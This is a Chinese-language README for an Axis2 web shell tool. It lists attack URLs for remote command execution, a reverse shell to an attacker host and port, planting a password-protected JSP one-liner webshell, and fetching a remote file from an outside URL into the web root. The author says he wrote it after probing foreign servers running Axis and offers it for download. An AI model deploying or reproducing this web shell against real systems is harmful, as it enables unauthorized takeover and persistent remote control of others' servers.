axis2
=========

axis2 web shell  
author : Svti  
url : https://github.com/Svti/Axis2Shell  

使用介绍：  

1、命令执行  
http://1.1.1.1/services/config/exec?cmd=whoami  
(不说了，执行命令。注意:xml换行没有处理好)  

2、反弹shell  
http://1.1.1.1/services/config/shell?host=1.1.1.1&port=5555  
(Linux则使用bash反弹shell，Windows则会进行socket执行shell)  

3、文件上传  
http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp  
(会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名)  

4、文件下载  
http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&path=/opt/tomcat/webapps/ROOT/shell.jsp  
(会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名)  


5、class目录查看  
http://1.1.1.1/services/config/getClassPath  
(会显示当前class的路径，方便文件上传)  

ps:  
趁周末休息，看了几个国外的机器有 axis的 项目，特地去找了@园长的Cat.aar工具，发现真心不好使。  

1、反弹shell 鸡肋，好多错误 ，ls / 都不行。   

2、没有文件上传功能。这个对于一个渗透着来说很重要  

于是自己写了个，希望大家喜欢。  

源码已经上github https://github.com/Svti/Axis2Shell  

aar 文件 https://github.com/Svti/Axis2Shell/blob/master/config.aar  也在github上面，还有什么问题，可以在下面评论   


注意：   

1、相同文件名的aar文件只能上传一次，虽说是remove Service了，服务器上面的还在。想要继续使用，请rename   

2、默认的jsp一句话木马是/resource/one.txt，可以自己修改。默认密码是wooyun，发布版本里面放的是one.jsp，一向鄙视伸手党  
3、Linux反弹shell 会在当前目录生成一个wooyun.sh的文件，当shell断开后会自动删除  

